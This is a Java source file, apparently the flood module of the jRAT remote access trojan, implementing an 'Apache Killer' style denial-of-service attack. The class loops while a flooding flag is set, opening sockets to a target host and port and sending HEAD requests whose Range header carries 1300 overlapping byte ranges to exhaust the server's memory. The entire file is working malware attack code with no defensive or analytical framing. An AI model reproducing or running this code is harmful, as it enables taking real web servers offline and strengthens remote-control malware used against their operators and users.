package pro.jrat.stub.flood;
import java.net.Socket;

import pro.jrat.stub.Constants;


public class ARME implements Runnable {

	public String target;
	public int port;

	public ARME(String t, int p) {
		target = t;
		port = p;
	}

	public void run() {
		while (Constants.flooding) {
			try {
				Socket sock = new Socket(target, port);
				String p = "";
				for (int i = 0; i < 1300; i++) {
					p += ",5-" + i;
				}
				sock.getOutputStream().write(("HEAD / HTTP/1.1\r\nHost: " + target + "\r\nRange:bytes=0-" + p + "\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n").getBytes("UTF-8"));
				sock.close();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
